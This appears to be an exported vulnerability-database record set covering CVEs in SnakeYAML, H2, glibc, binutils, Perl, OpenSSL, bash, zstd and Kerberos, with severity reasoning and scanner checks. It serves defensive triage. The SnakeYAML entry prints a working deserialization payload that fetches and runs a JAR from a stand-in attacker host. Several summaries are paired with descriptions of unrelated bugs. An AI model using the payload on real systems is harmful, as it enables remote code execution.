data.summary: SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.

more_details.description: SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.

high_profile_info.ShortDescription: A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.
high_profile_info.FullDescription:
[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.

It was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.

SnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious
payload is deserialized.

To exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. 
The attacker must deserialize a [Java "gadget" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.

A remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:
```
String strYaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://attacker.com\"]]]]";;
Yaml yaml = new Yaml(new Constructor(Foo.class));
yaml.load(strYaml);
```
The PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.

Note that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`

ExtendedImpactReasons.Name: The issue has an exploit published
ExtendedImpactReasons.Description: PoC demonstrates remote code execution.

ExtendedImpactReasons.Name: Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector
ExtendedImpactReasons.Description: An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.

ExtendedImpactReasons.Name: The issue results in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: Remote code execution.

ExtendedImpactReasons.Name: The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)
ExtendedImpactReasons.Description: It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments.

cve_applicability_info.scanner_explanation:
The scanner checks whether any of the vulnerable functions are called -

  • Yaml.load
  • Yaml.loadAll
  • Load.loadFromString
  • Load.loadAllFromString
  • Load.loadFromInputStream
  • Load.loadAllFromInputStream
  • Load.loadFromReader
  • Load.loadAllFromReader

In addition, the scanner also checks whether a mitigation is used (initiating Yaml with a SafeConstructor).
cve_applicability_info.info: The vulnerable function Load.load(All)FromString is never called with external input

data.summary: ** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states "This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that."

more_details.description: ** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states "This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that."

high_profile_info.ShortDescription: (Non-issue) Incorrect usage of the H2 Database Engine may result in password leakage for the H2 Console.
high_profile_info.FullDescription:
[h2database](https://github.com/h2database/h2database) is an open-source lightweight Java Database. H2 Database supports standard database APIs such as SQL and JDBC API. The H2 Database can also be used in embedded and server modes. H2 Database has a web-based admin console that can be initialized via the CLI. The console is accessible via tool options that are declared by the H2 Database. 

The H2 console supports the `-webAdminPassword` CLI argument which takes the web admin password as a value. Specifying this password in the CLI is unsafe since local attackers will be able to see the password in plain text when the process list is shown with the arguments used to run them.

This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.

ExtendedImpactReasons.Name: The issue has been disputed by the vendor
ExtendedImpactReasons.Description: This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.

data.summary: A buffer overflow was discovered in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.

high_profile_info.ShortDescription: Buffer overread in binutils leads to denial of service when reading debug information from a crafted ELF.
high_profile_info.FullDescription:
The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.
It was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable
For example - this can cause the `readelf` utility to crash when reading a crafted executable -
`readelf -w ./PoC`

Note that this issue cannot causes a 1-byte out-of-bounds write (overwriting a NULL terminator) which leads to an out-of-bounds read. Therefore - exploitation cannot lead to code execution in any case.
This leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.

ExtendedImpactReasons.Name: The issue has an exploit published
ExtendedImpactReasons.Description: A public PoC demonstrates DoS when running `readelf` on a crafted ELF

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: Crashing a forked client process (ex. objdump or any other executable from binutils) has a negligible security impact. In addition, a 1-byte overread is unlikely to cause a real-world crash or meaningful data leak.

ExtendedImpactReasons.Name: The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact
ExtendedImpactReasons.Description: NVD wrongly classifies this issue as a buffer overflow, when in fact this issue is an out-of-bounds read and therefore cannot lead to code execution in any case.

high_profile_info.ShortDescription: Buffer overread in binutils leads to denial of service when reading debug information from a crafted ELF.
high_profile_info.FullDescription:
The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.
It was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable
For example - this can cause the `readelf` utility to crash when reading a crafted executable -
`readelf -w ./poc2`

Note that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.
In addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.
This leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.

ExtendedImpactReasons.Name: The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact
ExtendedImpactReasons.Description: NVD wrongly classifies this issue as a buffer overflow, when in fact this issue is an out-of-bounds read and therefore cannot lead to code execution in any case.

ExtendedImpactReasons.Name: The issue has an exploit published
ExtendedImpactReasons.Description: A public PoC demonstrates DoS when running `readelf` on a crafted ELF

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: Crashing a forked client process (ex. objdump or any other executable from binutils) has a negligible security impact. In addition, a 1-byte overread is unlikely to cause a real-world crash or meaningful data leak.

high_profile_info.FullDescription:
The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.
It was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable
For example - this can cause the `readelf` utility to crash when reading a crafted executable -
`readelf -w ./poc2`

Note that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.
In addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.
This leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.

ExtendedImpactReasons.Name: The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact
ExtendedImpactReasons.Description: NVD wrongly classifies this issue as a buffer overflow, when in fact this issue is an out-of-bounds read and therefore cannot lead to code execution in any case.

ExtendedImpactReasons.Name: The issue has an exploit published
ExtendedImpactReasons.Description: A public PoC demonstrates DoS when running `readelf` on a crafted ELF

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: Crashing a forked client process (ex. objdump or any other executable from binutils) has a negligible security impact. In addition, a 1-byte overread is unlikely to cause a real-world crash or meaningful data leak.

cve_applicability_info.scanner_explanation:
The scanner checks for calls to the vulnerable functions with external input:

  • ObjectMapper.writeValue()
  • ObjectMapper.writeValueAsString()
  • ObjectMapper.writeValueAsBytes()
  • ObjectWriter.writeValue()
  • ObjectWriter.writeValueAsString()
  • ObjectWriter.writeValueAsBytes()
  • ser.DefaultSerializerProvider.serializeValue()

For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The input argument to those functions is a cyclic object (e.g. a HashMap object with a reference to itself).
cve_applicability_info.info: The vulnerable functions writeValueAsString, writeValueAsBytes, writeValue, serializeValue are never called with external input

data.summary: In Perl 5.34.0, function S_find_uninit_var in sv.c has a stack-based crash that can lead to remote code execution or local privilege escalation.

more_details.description: In Perl 5.34.0, function S_find_uninit_var in sv.c has a stack-based crash that can lead to remote code execution or local privilege escalation.

high_profile_info.ShortDescription: Stack exhaustion in Perl 5.34.0 can lead to denial of service when a warning error of type `uninitialized` tries to get an undefined variable's value.
high_profile_info.FullDescription:
[Perl 5 (often referred to as Perl)](https://www.perl.org/) is a high-level programming language known for its flexibility and text-processing capabilities, commonly used for scripting, automation, and web development tasks. It emphasizes readability and expressiveness, allowing developers to efficiently manipulate data and perform various tasks.
An issue has been discovered when handling warnings. The internal function `s_find_uninit_var()` checks for uninitialized variables. In case both the array/hash and the index are undefined, the warning mechanism tries to get the value of the index and then enters an infinite loop which causes stack exhaustion and eventually leads to Denial of Service.

Example of vulnerable code:
```perl
#!/usr/bin/perl
use warnings;
$x{$y}  # or $x[$y] where both x and y are undefined.
```

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: The issue is not influenced from attacker input and therefore is very unlikely to exist in real-world code (since any execution of the vulnerable code would cause the infinite loop to happen)

ExtendedImpactReasons.Name: The prerequisites for exploiting the issue are extremely unlikely
ExtendedImpactReasons.Description: The perl script must either use the `warning` pragma or be run with the `-w` option of perl.

ExtendedImpactReasons.Name: Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector
ExtendedImpactReasons.Description: The attackers must find a remote input that allows to inject of code in a Perl script running with the warnings enabled.

ExtendedReferences.Title: Issue discussion on official perl's GitHub repository

cve_applicability_info.scanner_explanation:
The scanner checks whether the warning pragma is used in the code.

The scanned does not check whether a Perl script is run with the -w option. Hence, it necessitates manual verification.

data.summary:
Issue summary: The AES-SIV cipher implementation contains a bug that causes
it to ignore empty associated data entries which are unauthenticated as
a consequence.

Impact summary: Applications that use the AES-SIV algorithm and want to
authenticate empty data entries as associated data can be mislead by removing
adding or reordering such empty entries as these are ignored by the OpenSSL
implementation. We are currently unaware of any such applications.

The AES-SIV algorithm allows for authentication of multiple associated
data entries along with the encryption. To authenticate empty data the
application has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with
NULL pointer as the output buffer and 0 as the input buffer length.
The AES-SIV implementation in OpenSSL just returns success for such a call
instead of performing the associated data authentication operation.
The empty data thus will not be authenticated.

As this issue does not affect non-empty associated data authentication and
we expect it to be rare for an application to use empty associated data
entries this is qualified as Low severity issue.

more_details.description: Issue summary: The AES-SIV cipher implementation contains a bug that causes it to ignore empty associated data entries which are unauthenticated as a consequence. Impact summary: Applications that use the AES-SIV algorithm and want to authenticate empty data entries as associated data can be mislead by removing adding or reordering such empty entries as these are ignored by the OpenSSL implementation. We are currently unaware of any such applications. The AES-SIV algorithm allows for authentication of multiple associated data entries along with the encryption. To authenticate empty data the application has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with NULL pointer as the output buffer and 0 as the input buffer length. The AES-SIV implementation in OpenSSL just returns success for such a call instead of performing the associated data authentication operation. The empty data thus will not be authenticated. As this issue does not affect non-empty associated data authentication and we expect it to be rare for an application to use empty associated data entries this is qualified as Low severity issue.

data.summary: A flaw was found in the bash package, where a heap-buffer overflow can occur in valid parameter_transform. This issue may lead to memory problems.

more_details.description: A flaw was found in the bash package, where a heap-buffer overflow can occur in valid parameter_transform. This issue may lead to memory problems.

high_profile_info.ShortDescription: Out-of-bound read in Bash can lead to denial of service when processing a crafted parameter expansion.
high_profile_info.FullDescription:
[Bash](https://www.gnu.org/software/bash/) is a Unix shell, which is a command-line interface for interacting with an operating system. It is the default shell for most Linux distributions. Bash allows users to execute commands, manipulate files, and run scripts to automate tasks.

When bash is compiled with [ASAN (AdressSanitizer)](https://github.com/google/sanitizers/wiki/AddressSanitizer), a script using a crafted [Shell parameter expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) of type `${parameter@operator}` can lead to out-of-bound read of 1 byte. 
In some circumstances (ex. Bash is compiled with ASAN) this can crash the bash process, but triggering a crash is unlikely in real-world scenarios.

The attackers must find a remote input that propagates to a bash script using this special parameter expansion which is not easy at all and very unlikely.

ExtendedImpactReasons.Name: The issue is trivial to exploit and does not require a published writeup or PoC
ExtendedImpactReasons.Description: Attackers can simply create a parameter transformation on a variable that contains the same parameter transformation

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: In some circumstances (ex. Bash is compiled with ASAN) exploiting this issue can crash the bash process, but triggering a crash is unlikely in real-world scenarios.

ExtendedImpactReasons.Name: The prerequisites for exploiting the issue are extremely unlikely
ExtendedImpactReasons.Description:
The attackers must find a remote input that propagates to a bash script using the special parameter expansion `${parameter@operator}` where the parameter is taken from a user-controlled input. 
This is extremely unlikely to happen in a remote scenario.

data.summary: In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that "cat /etc/passwd" shows a rogue user account.

high_profile_info.ShortDescription: Out-of-bounds read in zstd may lead denial of service when using crafted command-line arguments.
high_profile_info.FullDescription:
[Zstandard](https://facebook.github.io/zstd/) is a fast lossless compression algorithm, providing high compression ratios and targeting real-time compression scenarios at zlib-level.
`zstd` is the reference implementation in C that offers a very wide range of speed / compression trade-off, and is backed by an extremely fast decoder.
It was discovered that running the `zstd` tool with arbitrary arguments can lead to an OOB read due to a design flaw, which may lead to a crash of `zstd`. Since `zstd` is a standalone (forked) tool - the crash has a minimal security impact.

Specifically, passing the `--output-dir-flat` or `--output-dir-mirror` arguments with an empty string, leads to an OOB read.

It should be noted that the OOB read is of 1 byte only, which on modern systems does not even lead to a crash (in most cases of production-built software)

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: Crashing a forked process has minimal to no security impact. Furthermore, a 1-byte OOB read will not lead to a crash in almost all cases.

ExtendedImpactReasons.Name: Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector
ExtendedImpactReasons.Description: The attacker must be able to supply command line arguments to an invocation of the `zstd` CLI tool.

ExtendedImpactReasons.Name: The issue is trivial to exploit and does not require a published writeup or PoC
ExtendedImpactReasons.Description: Passing an empty string to the flags "--output-dir-flat" or "--output-dir-mirror" will trigger the 1-byte OOB read

ExtendedImpactReasons.Name: The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact
ExtendedImpactReasons.Description: The CVSS does not take into account the high attack complexity and low real-world severity of this issue

data.summary: chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.

more_details.description: chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.

data.summary: The demangle_template function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31.1, has a memory leak via a crafted string, leading to a denial of service (memory consumption), as demonstrated by cxxfilt, a related issue to CVE-2018-12698.

more_details.description: The demangle_template function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31.1, has a memory leak via a crafted string, leading to a denial of service (memory consumption), as demonstrated by cxxfilt, a related issue to CVE-2018-12698.

data.summary: GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

more_details.description: GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

data.summary: The C++ symbol demangler routine in cplus-dem.c in libiberty, as distributed in GNU Binutils 2.29, allows remote attackers to cause a denial of service (excessive memory allocation and application crash) via a crafted file, as demonstrated by a call from the Binary File Descriptor (BFD) library (aka libbfd).

data.summary: An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

more_details.description: An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

high_profile_info.ShortDescription: (Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.
high_profile_info.FullDescription:
[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.

A [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realmâ€™s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. 

In `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.

Originally, the vulnerability was mistakenly reported as an Integer Overflow.
The issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.

To trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:
```
kdb5_util load -d DB_NAME DB_FILE 
```

ExtendedImpactReasons.Name: Exploiting the issue requires the user to interact with the vulnerable software
ExtendedImpactReasons.Description: Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.

ExtendedImpactReasons.Name: The issue cannot result in a severe impact (such as remote code execution)
ExtendedImpactReasons.Description: The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.

ExtendedImpactReasons.Name: The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact
ExtendedImpactReasons.Description: The CVSS does not reflect the fact that the vulnerability does not have any security impact.

ExtendedImpactReasons.Name: The prerequisites for exploiting the issue are extremely unlikely
ExtendedImpactReasons.Description: A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.
